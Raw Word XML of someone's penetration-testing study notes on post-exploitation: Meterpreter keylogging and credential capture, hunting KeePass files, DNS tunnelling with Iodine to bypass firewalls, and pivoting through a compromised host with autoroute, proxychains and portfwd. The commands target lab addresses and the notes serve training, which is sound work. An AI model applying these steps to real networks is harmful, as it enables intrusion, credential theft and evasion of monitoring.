    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004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user /domain ←→ Enum_ad_users  </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000043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groups via</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000043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localgroup (shell)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000043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q4g9ie3hyrs" w:id="154"/>
        <w:bookmarkEnd w:id="15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Shares</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000043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 share (shell ) ←→ enum_shares</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000043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9elh3z14eh8" w:id="155"/>
        <w:bookmarkEnd w:id="15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w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000043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Metasploit scripts</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000043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Windows : Scaper / winenum</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000044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41">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0blsny349he" w:id="156"/>
        <w:bookmarkEnd w:id="15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Display</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000044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Screenshot</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000044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keyscan_start , etc</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000044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Depending on process attached to, meterpreter can  log  specific things</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000445">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6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Winlogons.exe  (system) → credentials</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000446">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6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Explorere.exe (user level) → application keystrokes</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000447">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6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Example;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000448">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="6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Migrate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explorer process </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000449">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="6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Keyscan_start </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000044A">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="6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Keyscan_dump</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4B">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="6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keyscan _stop</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4C">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6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Another Type;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000044D">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="6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keylogrecorder -c</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4E">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="63"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="72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 </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000044F">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u4jsxrppt6p" w:id="157"/>
        <w:bookmarkEnd w:id="15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 Pillaging )</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000045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File with kdb extension</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000451">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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 -f *.kdb -r -d .</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000452">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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45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w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000045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w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000455">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pvntjgx64zs" w:id="158"/>
        <w:bookmarkEnd w:id="15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 Tunnelling ,  Exfiltration</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000045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 not being logged, </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000045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Iodine </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000045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 Tunnel, through ssh sock server completely over DNS tunnel → bypassing firewalls and proxy</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000045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Iodines requires:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000045A">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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Control over a domain name and dns configuration</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000045B">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>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 address to act as auth name server (with ssh access)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000045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5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hatbnbekv1t" w:id="159"/>
        <w:bookmarkEnd w:id="15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Mapping the Internal Network</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000045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Looking for:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000045F">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7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equipment; firewall, switches, routers </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000460">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7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Other networked host &amp; servers</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000461">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7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Networking protocols &amp; ip addresses</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000462">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="73"/>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Traffic and data</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000046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Ifconfig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meterpreter </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000046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print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(ip routing table)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000046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(shows the arp cache)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000046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Netstat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 network connections) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000046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6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traffic through the compromised machine</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000046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Arp_scanner → meterpreter, arp scan in local network and list the IP and MAC addresses. IE.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arp_scanner -r 10.10.10.0/24</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000046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Ping sweep → find more live box, meterpreter script. IE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use post/multi/gather/ping_sweep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a session</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000046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6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Netenum </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000046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6E">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ndmkob2xu5i" w:id="160"/>
        <w:bookmarkEnd w:id="16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PIVOTING</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000046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862388" cy="243256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62388" cy="2432561"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect"/>
                      <a:ln/>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:inline>
          </w:drawing>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000047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Subnet → 10.10.10.0/24.</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GOTO victim2 from victim1</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000047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ADD NEW ROUTE</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000047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TWO WAYS</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000473">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="65"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="200" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="72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add 10.10.10.0 255.255.255.0 2</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000474">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="65"/>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2 → session id . Ie. all traffic to 10.10.10.0/24 will go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through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victim1</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000475">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="65"/>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is in msf console , can do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print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after to check</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000476">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="65"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="0" w:beforeAutospacing="0" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="720" w:hanging="360"/>
        <w:rPr>
          <w:ins w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:eastAsia="Roboto" w:hAnsi="Roboto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:fill="9900ff"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autoroute -s 10.10.10.0/24</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000477">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="65"/>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is run from within a meterpreter shell</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000478">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="65"/>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autoroute -p</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000047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47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kali</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000047C">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4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Running a port scan;  </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000047D">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="47"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="0" w:beforeAutospacing="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auxiliary/scanner/portscan/tcp</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000047E">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="47"/>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options . Victim 2 IP (10.10.10.5)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000047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Flush </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000048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48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ROUTING NMAP </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000048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session to get tools through. EG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socks4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 metasploit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and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proxychains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route traffic through this proxy</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000483">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3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auxiliary/server/socks4a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84">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="37"/>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Uses a socks proxy server with the metasploit routing to relay connections</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000485">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="37"/>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Change the srvport (listens on) eg. 1080</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000486">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3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Configure proxychains to use address and port set in Metasploit</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000487">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="37"/>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Proxychains.conf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socks4 127.0.0.1 1080</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000488">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="37"/>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Local address on port specified</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000489">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="37"/>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means</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000048A">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="3"/>
          <w:numId w:val="37"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0"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 route → Proxychains → METASPLOIT ( socks4a proxy) → METERPRETER routes → METERPRETER session</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000048B">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3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Run toolset needed</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000048C">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="37"/>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Proxychains -nmap -sT -Pn -n 10.10.10.5 --top-ports 50</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000048D">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="37"/>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Proxychains ssh 10.10.10.X</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000048E">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="37"/>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Proxychains telnet 10.10.10.X</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000048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9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Netstat -tulpn | grep 1080</w:t>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000049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9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9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NOTE: </w:t>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000049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portfwd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to forward connections to specific addresses and ports on remote </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000495">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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Access 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web</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server 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share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or any other service (METERPRETER)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000496">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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Portfwd add -l 3333 -p 3389 -r 10.10.10.5</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97">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="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Listener on prt 3333 and forward conn to 10.10.10.5 on port 3389 </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000498">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="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port forward → meterpreter session → exploited machine ()→ target machine</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000499">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>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Rdp 127.0.0.1:3333</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000049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9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x21x9yv923e" w:id="161"/>
        <w:bookmarkEnd w:id="16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(MAPPING THE NETWORK)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000049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exploited machine is on a different network</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000049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ifconfig on both machines</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000049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Going into shell, ipconfig /all</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000049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Ipconfig /displaydns</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004A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Netstat -ano</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004A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A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exploited machine as a bridge and forwards all the traffic (like a proxy)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004A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post/windows/manage/autoroute</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004A4">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9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the subnet &amp; session </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004A5">
      <w:pPr>
